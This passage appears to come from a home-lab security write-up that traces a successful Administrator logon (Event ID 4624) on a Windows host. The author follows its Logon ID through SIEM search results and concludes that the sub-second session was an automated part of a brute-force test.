Yes. A successful Windows logon (**Event ID 4624**) was identified for the `Administrator` account.

### Investigating Activity After the Login

To investigate what happened after the successful login, I took the **Target Logon ID** from the Event ID 4624 event:

`0x2fa965f`

I then added the Target Logon ID, hostname and `Administrator` account to the search before removing the other filters. This left me with the following search for the `MyDFIR-WIN` host:

```text
Administrator and 0x2fa965f
```

<img width="1719" height="585" alt="image" src="https://github.com/user-attachments/assets/ec352ac5-18f3-4d15-847b-1c904d7d4345" />

Using the Logon ID allowed me to follow events associated with that specific login session.

The results showed:

- **Logged in:** Aug 3, 2026 @ 12:06:18.265
- **Logged off:** Aug 3, 2026 @ 12:06:19.068
- The `Administrator` account was assigned special privileges during the session.

The account logged in and then logged off less than a second later. This suggests the login was **automated as part of the brute-force test**, rather than someone establishing and using an interactive RDP session.

No further activity associated with this Logon ID was identified.



